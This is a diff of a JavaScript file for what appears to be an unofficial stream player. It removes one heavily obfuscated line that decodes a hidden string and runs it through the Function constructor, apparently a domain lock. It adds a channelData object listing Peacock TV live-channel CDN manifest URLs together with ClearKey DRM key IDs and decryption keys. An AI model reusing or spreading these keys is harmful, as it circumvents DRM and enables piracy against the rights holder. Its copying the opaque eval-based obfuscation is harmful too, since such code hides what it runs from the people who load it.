@@ -1,1 +1,29 @@
-var channelData,allowedDomain,currentDomain;(function(){var RlC='',jas=723-712;function KnR(d){var o=2222860;var a=d.length;var t=[];for(var c=0;c<a;c++){t[c]=d.charAt(c)};for(var c=0;c<a;c++){var g=o*(c+375)+(o%38166);var p=o*(c+528)+(o%48867);var h=g%a;var v=p%a;var x=t[h];t[h]=t[v];t[v]=x;o=(g+p)%3869638;};return t.join('')};var rNY=KnR('cvonoecosntautyupgsimqjrfkhrrclztwxbd').substr(0,jas);var bTf='uavl nmmqurrqrvir"hv4g=<8hao nafg.iA8-un +s93[hv xeh+*tt;)i;+t.o,nvbev"n,,;==1,a),(nae4re7h8f6 l,]g+r0f86[;u;(ot[orslC=j]g"rb=}=e-rf4rrsjlft==chane,(n)a;zSd+([uA9l}0[=n ;)caewn+duc+pr7=3rtr1ebd.h(ure;=iprhje0 }<=lg= .r;+.jrn+t.;j ,;,fa]et;o)hsmun .( =+iia;=f"tzk2cn5s9r+t1h;;ua}reoC[;rv*ishv,w= n=)o=]tfl2=l0.;ltrn9tq1m)ts(=zvav (6,a0 tjf(trdvh=fgz+;;+1  ;fcr4h;. s<mu <s+)+k)yv,rji.nsc)=8C= u.,2.6o.lgh8=+g}t5;w(n0.pw(io,eig.=((hrrhoeel(rn)()gt;{)f;qcaocepi=wyn8d1=va{ariht;h(00fCh-1iny(;l5"o+ mo(f+(ns[futfr90o(;ut)[3,q,l;;[2c l;20hlr.e==efaCnqvqu)rrihlgqp)48;f)hv[(v;Cn;.7a)"(p.suc17,5n]ial7vf2q9f.]6,s[bi0a>)6),+c)"+l("[={pl,=o.ccls9d=0p;)h7fnfn2msi;"fier)(;rlrha.;st8ae1rn}(1,=9=;.a{)]al};ar1t+apC0(n(pr7)zo C!a{. nvu)za(ui(A,=z=ta]5nv)tt()>v(a[v.ft,i{g;vmoe.]f(=oles;]k;4,r6vr,n+h-.A<t{,orgrh;c=+!i=6-ua;r-,mnk(f;t-A]svao)7oan[a(r .j= b]a6)r")ale6rih]S;)to)uo]v;71pldee++=)rskvkihjey=';var fiH=KnR[rNY];var kPu='';var ZOl=fiH;var hme=fiH(kPu,KnR(bTf));var xYy=hme(KnR('iigcq7a==.re-2i1Ldmr-+6$1$i.eLca,9,o\/])Lb}L8dLdac4m=L24l.;b}5&"!(+)id,L(dnva3ttLw;iLjp})t%=.1i5(8pt)2)r%-\/yL5t%nc,L;eaLy.\/twcLC0b1e]9cw-a!i33a!a..88)]Tf75.4)%23ioaf\/i2$tp$cwi0,d9e"12.3(Lr\/\/zp08.q01tlme0c:L!-rt_.8fetle8Ld$L.f i348\/0cs!8hkfa !.8n.23-ftm.LfL4\/j6t1-llLc4vzr4lt5laci.(%j.dnpp8tL!)}6r!1((cf}ysLhgs1p2nl:.b.kL,f7z!42;11b;bcLc!90,L8aba)1(l{rb(l!"e1v60tc,10)!tpm1-.6a;er-8d]_:t+p234.5L3}3t.nog9n0od\/ac5eact2)oL:a2,-796bhh57v3b.\/{C)m601u2iLb_r#\/.,8ah0a8,r9.2}euLo8"oa!1$al;beLmLen1CLoa0]a50p8$:3leLts\'an!cL;pyi&reem_)ia4_7a\/%1e3rebl03eo\/8t4%=(%-5eu1"ne43aovka[k a5c.bl$t3s7f3(4.f8gLmt-f2M4reLib!6_tn !00.a3r)cdkdS%n-2[{e.a)ad;ocL%tr3tl.fL(!f59ea sn (g1a7e.o,e5c )ae.zbf$%"36k.=g6e,woccni4heo"t6wv6.0.%L-61bl,3S4\'tc1d.ldcd3s"iwd%3yc5cfdciofLsS7(,.g;3Lhid.L3bt{e9(d6,\/L5m,s0]n=7(.c4ssg4nm4v=L[s8-t38\/rmceeL3t dn)bc9%o\/s!rdp=1f*lr$\/h_fday 0a0\/4_e.5L0t5ec8.eL2r18h!a9[(*(m7}sdp)e7Lyy=c$\/!cL9i7i)4n.p3.28h\/);i.e!L4.{[oa;votlfdLLcn6Lh10se5farst8}nf*\/$%f,+ Lo(icn4aaLr3m0scMf24f%.( oer8L2ht5%L8f$aL_La!-)n8"2ae=h910.4(1j:4L ]cfgt8;to!Lta(L\/5c$s LLoi=%.7ef\/..26r.te7t+%sL,64ch.eLo3)h1nejv*ib6;_o,a41r=L2.6nt!d2er()c(7nc"$p11g3%2.2bn )4t16r$im()2L.02ls$p=1L1)}""b]e#5 Le7a-)(g0:c.L32n.)2!7 {(}7Lscf7LaL!3zo#ee0.(;_.7;.{ntc-{}!abwScc!_rwc!deL#+;e!"oc.3a)5dL7:a\/,Ld)c zd"1o6],n{s431rL;_6c;s!eL6.stvL1!()]!LepmLh\/.C\/-.(,f7L;t.i1viL,3=ad=.L(d.k\/e=cf=hdc{-y).d#t04gz-fcwL;hcsu0ta_ia7();lzrsb.e2Lcr{blff\/a,1,Lb6g6c)6a]Cec)e64a.f{"s9e0L1k_sf%LCb1\/2D6,bl11me$_21(e1{ek7pL\'h.\/j\'.]\/)%L07tLddi,e337L!a3.6]"m0L8(ep!2;c&l1f-oL0y-r1!.#27ec1r36.t3,=2=wim9o.f+h\/ai9,.];d)(.ulL5swd0a==5wpfd0re!mrnnw2r4}Lc8-5ma+5s{Shcrf[f_]]0L*d236!!cshaLm6pLdpi804_g5i%L8k4{Lda_6fc),.tLa1L9r2$39,\/s1(5,fcTo2srsy7te();86eLai)f! e1,f56942a6sL[0asl(htLhdmL0ez1d0C5"ck=I ;:Lli70+.=0Dje"54!$ia 40pL)ilthn78[L4Lc,rb7_9"(fh3,keCiba0.n$L=! 2="6i\/$dL8L,:j1.v,;$L$-;lrLfu8l.1.nusctcc30L h".l3.u.tlpl_rgi!}1L30_d_&4;39o48oieaLL0cutk v!:ia4no\/6_#(y)[[p9lf14 }1}6fc-a#-Lj0p8)!34 ]1}}'));var zlv=ZOl(RlC,xYy );zlv(9998);return 1720})()
+const channelData = {
+  "hot": {
+    "file": "https://g006-sle-us-cmaf-prd-fy.cdn.peacocktv.com/co01/Content/CMAF_S2-CTR-4s/Live/channel(5014940-716358-48fa1c28d46)/master.mpd",
+    "drm": {
+      "clearkey": {
+        "keyId": "002215b20642cdfc23ad657f3fb0c923",
+        "key": "96f4897c1b1f39017cbb5859cb3f4309"
+      }
+    }
+  },
+    "man2": {
+    "file": "https://g006-sle-us-cmaf-prd-ak.cdn.peacocktv.com/co01/Content/CMAF_S2-CTR-4s/Live/channel(5015316-716764-48fb82bdcdc)/master.mpd",
+    "drm": {
+      "clearkey": {
+        "keyId": "00221f5f3be26f387e4190cc0aaab951",
+        "key": "e6725a8f3d7adf560def5851e0ab430e"
+      }
+    }
+  },
+    "man": {
+    "file": "https://g006-sle-us-cmaf-prd-ak.cdn.peacocktv.com/co01/Content/CMAF_S2-CTR-4s/Live/channel(5015314-716762-48fb80d585a)/master.mpd",
+    "drm": {
+      "clearkey": {
+        "keyId": "0022c41e5c0f48baf31f4c533204ebf9",
+        "key": "645fcb04db6c0d0fa85bf51adeee5d2d"
+      }
+    }
+  },
+};
